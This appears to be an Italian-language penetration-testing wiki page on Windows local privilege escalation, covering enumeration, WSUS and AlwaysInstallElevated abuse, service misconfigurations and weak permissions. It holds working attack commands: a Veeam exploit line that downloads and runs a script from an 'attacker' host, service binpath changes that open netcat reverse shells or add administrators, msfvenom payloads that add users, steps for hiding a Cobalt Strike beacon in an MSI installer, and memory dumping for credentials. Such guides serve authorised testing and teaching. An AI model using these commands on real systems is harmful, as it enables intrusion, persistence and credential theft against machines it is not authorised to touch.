# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Miglior strumento per cercare Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoria iniziale di Windows

### Access Tokens

**Se non sai cosa sono i Windows Access Tokens, leggi la pagina seguente prima di continuare:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consulta la pagina seguente per maggiori informazioni su ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Se non sai cosa sono gli integrity levels in Windows dovresti leggere la pagina seguente prima di continuare:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Ci sono diverse cose in Windows che potrebbero **impedirti di enumerare il sistema**, eseguire eseguibili o anche **rilevare le tue attività**. Dovresti **leggere** la seguente **pagina** ed **enumerare** tutti questi **meccanismi** di **difesa** prima di iniziare l'enumerazione per privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

I processi UIAccess lanciati tramite `RAiLaunchAdminProcess` possono essere abusati per raggiungere High IL senza prompt quando i controlli di secure-path di AppInfo vengono bypassati. Consulta il workflow dedicato di bypass per UIAccess/Admin Protection qui:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## Informazioni sul sistema

### Enumerazione delle informazioni sulla versione

Verifica se la versione di Windows ha vulnerabilità conosciute (controlla anche le patch applicate).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploit per versione

Questo [site](https://msrc.microsoft.com/update-guide/vulnerability) è utile per cercare informazioni dettagliate sulle vulnerabilità di sicurezza Microsoft. Questo database contiene più di 4.700 vulnerabilità di sicurezza, mostrando la **enorme superficie d'attacco** che un ambiente Windows presenta.

**Sul sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ha watson incorporato)_

**Localmente con informazioni sul sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repo GitHub di exploit:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ambiente

Qualche credenziale/informazione Juicy salvata nelle variabili d'ambiente?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Cronologia di PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### File di trascrizione di PowerShell

Puoi imparare come attivarlo in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

I dettagli delle esecuzioni della pipeline di PowerShell vengono registrati, includendo i comandi eseguiti, le invocazioni di comandi e parti degli script. Tuttavia, i dettagli completi dell'esecuzione e i risultati di output potrebbero non essere catturati.

Per abilitarlo, segui le istruzioni nella sezione "Transcript files" della documentazione, scegliendo **"Module Logging"** invece di **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Per visualizzare gli ultimi 15 eventi nei log di PowersShell puoi eseguire:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Viene catturato un record completo delle attività e del contenuto dell'esecuzione dello script, garantendo che every block of code sia documentato mentre viene eseguito. Questo processo preserva una audit trail completa di ogni attività, utile per forensics e per l'analisi di malicious behavior. Documentando tutta l'attività al momento dell'esecuzione, fornisce approfondimenti dettagliati sul processo.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Gli eventi di log per lo Script Block possono essere trovati nel Windows Event Viewer al percorso: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Per visualizzare gli ultimi 20 eventi puoi usare:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Impostazioni Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Unità
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Puoi compromettere il sistema se gli aggiornamenti non vengono richiesti usando http**S** ma http.

Inizia verificando se la rete utilizza un aggiornamento WSUS non-SSL eseguendo quanto segue in cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Oppure il seguente in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Se ricevi una risposta come una di queste:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` o `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` è uguale a `1`.  

Allora, **è sfruttabile.** Se l'ultimo valore del registro è uguale a `0`, allora la voce WSUS verrà ignorata.

Per sfruttare queste vulnerabilità puoi usare strumenti come: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - sono script exploit MiTM weaponizzati per iniettare aggiornamenti 'fake' nel traffico WSUS non-SSL.

Leggi la ricerca qui:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Fondamentalmente, questo è il difetto che sfrutta questo bug:

> Se abbiamo il potere di modificare il proxy del nostro utente locale, e Windows Updates usa il proxy configurato nelle impostazioni di Internet Explorer, abbiamo quindi il potere di eseguire localmente [PyWSUS](https://github.com/GoSecure/pywsus) per intercettare il nostro traffico ed eseguire codice come utente elevato sul nostro asset.
>
> Inoltre, poiché il servizio WSUS usa le impostazioni dell'utente corrente, userà anche il suo certificate store. Se generiamo un certificato self-signed per l'hostname WSUS e aggiungiamo questo certificato nel certificate store dell'utente corrente, saremo in grado di intercettare sia il traffico HTTP che HTTPS di WSUS. WSUS non usa meccanismi simili a HSTS per implementare una validazione di tipo trust-on-first-use sul certificato. Se il certificato presentato è trusted dall'utente e ha l'hostname corretto, verrà accettato dal servizio.

Puoi sfruttare questa vulnerabilità usando lo strumento [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (una volta liberato).

## Auto-updater di terze parti e Agent IPC (local privesc)

Molti agent enterprise espongono una superficie IPC su localhost e un canale di update privilegiato. Se l'enrollment può essere forzato verso un server controllato dall'attaccante e l'updater si fida di una rogue root CA o di controlli di firma deboli, un utente locale può consegnare un MSI malevolo che il servizio SYSTEM installerà. Vedi una tecnica generalizzata (basata sulla catena Netskope stAgentSvc – CVE-2025-0309) qui:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` espone un servizio su localhost su **TCP/9401** che elabora messaggi controllati dall'attaccante, permettendo comandi arbitrari come **NT AUTHORITY\SYSTEM**.

- **Recon**: confermare il listener e la versione, e.g., `netstat -ano | findstr 9401` e `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: posizionare un PoC come `VeeamHax.exe` con le DLL Veeam richieste nella stessa directory, poi triggerare un payload SYSTEM sul socket locale:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Il servizio esegue il comando come SYSTEM.
## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. È importante notare che questi **requisiti** sono soddisfatti utilizzando le **impostazioni di default**.

Trova l'**exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Per maggiori informazioni sul flusso dell'attacco consulta [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Se** queste 2 chiavi del registro sono **abilitate** (valore **0x1**), allora utenti di qualsiasi privilegio possono **installare** (eseguire) `*.msi` file come NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Se hai una sessione meterpreter puoi automatizzare questa tecnica usando il modulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Usa il comando `Write-UserAddMSI` di power-up per creare, nella directory corrente, un binario MSI di Windows per ottenere privilegi elevati. Questo script scrive un installer MSI precompilato che richiede l'aggiunta di un utente/gruppo (quindi avrai bisogno di accesso GIU):
```
Write-UserAddMSI
```
Esegui semplicemente il binario creato per ottenere privilegi elevati.

### MSI Wrapper

Leggi questo tutorial per imparare come creare un MSI wrapper usando questi strumenti. Nota che puoi avvolgere un file "**.bat**" se vuoi **solo** **eseguire** **comandi**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** con Cobalt Strike o Metasploit un **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Apri **Visual Studio**, seleziona **Create a new project** e digita "installer" nella casella di ricerca. Seleziona il progetto **Setup Wizard** e clicca **Next**.
- Dai al progetto un nome, come **AlwaysPrivesc**, usa **`C:\privesc`** per la posizione, seleziona **place solution and project in the same directory**, e clicca **Create**.
- Continua a cliccare **Next** fino ad arrivare al passo 3 di 4 (choose files to include). Clicca **Add** e seleziona il Beacon payload che hai appena generato. Poi clicca **Finish**.
- Evidenzia il progetto **AlwaysPrivesc** in **Solution Explorer** e nelle **Properties**, cambia **TargetPlatform** da **x86** a **x64**.
- Ci sono altre proprietà che puoi modificare, come **Author** e **Manufacturer**, che possono rendere l'app installata più convincente.
- Fai clic destro sul progetto e seleziona **View > Custom Actions**.
- Fai clic destro su **Install** e seleziona **Add Custom Action**.
- Fai doppio clic su **Application Folder**, seleziona il tuo file **beacon.exe** e clicca **OK**. Questo garantirà che il payload beacon venga eseguito non appena l'installer viene avviato.
- Sotto le **Custom Action Properties**, imposta **Run64Bit** su **True**.
- Infine, buildalo.
- Se viene mostrato l'avviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, assicurati di aver impostato la piattaforma su x64.

### MSI Installation

Per eseguire l'installazione del file `.msi` dannoso in background:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Per sfruttare questa vulnerabilità puoi usare: _exploit/windows/local/always_install_elevated_

## Antivirus e Rilevatori

### Impostazioni di Audit

Queste impostazioni decidono ciò che viene **registrato**, quindi dovresti prestare attenzione
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, è interessante sapere dove vengono inviati i logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** è progettato per il **management of local Administrator passwords**, assicurando che ogni password sia **unique, randomised, and regularly updated** sui computer uniti a un dominio. Queste password sono memorizzate in modo sicuro in Active Directory e possono essere accessibili solo dagli utenti a cui sono state concesse autorizzazioni sufficienti tramite ACLs, permettendo loro di visualizzare le local admin passwords se autorizzati.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Se attivo, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

A partire da **Windows 8.1**, Microsoft ha introdotto una protezione avanzata per la Local Security Authority (LSA) per **bloccare** i tentativi di processi non attendibili di **leggere la sua memoria** o iniettare codice, aumentando così la sicurezza del sistema.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** è stata introdotta in **Windows 10**. Il suo scopo è proteggere le credenziali memorizzate su un dispositivo contro minacce come gli attacchi pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** sono autenticati dalla **Local Security Authority** (LSA) e utilizzati dai componenti del sistema operativo. Quando i dati di accesso di un utente vengono autenticati da un registered security package, i domain credentials per l'utente vengono tipicamente stabiliti.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Utenti e Gruppi

### Enumerare Utenti e Gruppi

Dovresti verificare se uno qualsiasi dei gruppi di cui fai parte abbia permessi interessanti
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Gruppi privilegiati

Se appartieni a qualche gruppo privilegiato potresti essere in grado di **escalate privileges**. Scopri i gruppi privilegiati e come abusarne per escalate privileges qui:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Scopri di più** su cos'è un **token** in questa pagina: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consulta la pagina seguente per **scoprire token interessanti** e come abusarne:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Utenti connessi / Sessioni
```bash
qwinsta
klist sessions
```
### Cartelle home
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politica delle password
```bash
net accounts
```
### Ottieni il contenuto degli appunti
```bash
powershell -command "Get-Clipboard"
```
## Processi in Esecuzione

### Permessi di file e cartelle

Prima di tutto, elencando i processi **controlla la presenza di password nella command line del processo**.\
Verifica se puoi **sovrascrivere qualche binary in esecuzione** o se hai permessi di scrittura nella cartella dei binary per sfruttare possibili [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Controlla sempre la presenza di eventuali [**electron/cef/chromium debuggers** in esecuzione, potresti abusarne per elevare i privilegi](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Verifica delle autorizzazioni dei binari dei processi**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Verifica dei permessi delle cartelle dei binari dei processi (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Puoi creare un dump della memoria di un processo in esecuzione usando **procdump** di sysinternals. Servizi come FTP contengono le **credentials in clear text in memory**: prova a fare un dump della memoria e leggere le credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Applicazioni GUI insicure

**Applicazioni in esecuzione come SYSTEM possono consentire a un utente di aprire una CMD o di esplorare le directory.**

Esempio: "Windows Help and Support" (Windows + F1), cerca "command prompt", clicca su "Click to open Command Prompt"

## Servizi

I Service Triggers permettono a Windows di avviare un servizio quando si verificano determinate condizioni (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Anche senza i diritti SERVICE_START spesso è possibile avviare servizi privilegiati attivando i loro trigger. Vedi le tecniche di enumerazione e attivazione qui:

-
{{#ref}}
service-triggers.md
{{#endref}}

Ottieni un elenco dei servizi:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permessi

Puoi usare **sc** per ottenere informazioni su un servizio
```bash
sc qc <service_name>
```
Si consiglia di avere il binario **accesschk** di _Sysinternals_ per verificare il livello di privilegi richiesto per ogni servizio.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Si consiglia di verificare se "Authenticated Users" possono modificare qualche servizio:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Abilitare il servizio

Se stai riscontrando questo errore (ad esempio con SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Puoi abilitarlo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Tieni presente che il servizio upnphost dipende da SSDPSRV per funzionare (per XP SP1)**

**Un'altra soluzione alternativa** a questo problema è eseguire:
```
sc.exe config usosvc start= auto
```
### **Modifica del percorso del binary del servizio**

Nel caso in cui il gruppo "Authenticated users" possieda **SERVICE_ALL_ACCESS** su un servizio, è possibile modificare l'eseguibile del servizio. Per modificare ed eseguire **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Riavviare il servizio
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
I privilegi possono essere elevati tramite varie autorizzazioni:

- **SERVICE_CHANGE_CONFIG**: Consente la riconfigurazione del binario del servizio.
- **WRITE_DAC**: Abilita la riconfigurazione dei permessi, consentendo di modificare le configurazioni del servizio.
- **WRITE_OWNER**: Consente l'acquisizione della proprietà e la riconfigurazione dei permessi.
- **GENERIC_WRITE**: Eredita la capacità di modificare le configurazioni del servizio.
- **GENERIC_ALL**: Inoltre eredita la capacità di modificare le configurazioni del servizio.

Per il rilevamento e lo sfruttamento di questa vulnerabilità, può essere utilizzato _exploit/windows/local/service_permissions_.

### Permessi deboli sui binari dei servizi

**Controlla se puoi modificare il binario eseguito da un servizio** o se hai **permessi di scrittura sulla cartella** dove si trova il binario ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Puoi ottenere ogni binario eseguito da un servizio usando **wmic** (not in system32) e verificare i tuoi permessi usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Puoi anche usare **sc** e **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permessi di modifica del registro dei servizi

Dovresti verificare se puoi modificare il registro di qualche servizio.\
Puoi **verificare** i tuoi **permessi** su un **registro** di servizio facendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Bisogna verificare se **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** possiedono i permessi `FullControl`. In tal caso, il binario eseguito dal servizio può essere alterato.

Per cambiare il Path del binario eseguito:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registro dei servizi — permessi AppendData/AddSubdirectory

Se hai questo permesso su un registry significa che **puoi creare sotto-registri a partire da questo**. Nel caso dei servizi Windows questo è **sufficiente per eseguire codice arbitrario:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Se il percorso di un eseguibile non è racchiuso tra virgolette, Windows proverà a eseguire ogni parte che termina prima di uno spazio.

Ad esempio, per il percorso _C:\Program Files\Some Folder\Service.exe_ Windows tenterà di eseguire:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Elenca tutti i percorsi di servizio non racchiusi tra virgolette, escludendo quelli appartenenti ai servizi integrati di Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Puoi rilevare e sfruttare** questa vulnerabilità con metasploit: `exploit/windows/local/trusted\_service\_path` Puoi creare manualmente un servizio binario con metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Azioni di ripristino

Windows permette agli utenti di specificare azioni da eseguire se un servizio si arresta. Questa funzionalità può essere configurata per puntare a un binary. Se questo binary è sostituibile, potrebbe essere possibile il privilege escalation. Maggiori dettagli sono disponibili nella [documentazione ufficiale](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applicazioni

### Applicazioni installate

Controlla i **permessi dei binaries** (magari puoi overwrite uno e escalate privileges) e delle **cartelle** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permessi di scrittura

Verifica se puoi modificare qualche file di configurazione per leggere qualche file speciale o se puoi modificare qualche binario che verrà eseguito da un account Administrator (schedtasks).

Un modo per individuare cartelle/file con permessi deboli nel sistema è il seguente:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Esecuzione all'avvio

**Verifica se puoi sovrascrivere qualche chiave di registro o binario che verrà eseguito da un altro utente.**\
**Leggi** la **pagina seguente** per saperne di più su interessanti **posizioni autoruns per l'escalation dei privilegi**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Driver

Cerca possibili driver **di terze parti strani/vulnerabili**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Se un driver espone una primitive di lettura/scrittura arbitrarie del kernel (comune in handler IOCTL mal progettati), puoi escalare rubando un SYSTEM token direttamente dalla memoria del kernel. Vedi la tecnica step‑by‑step qui:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

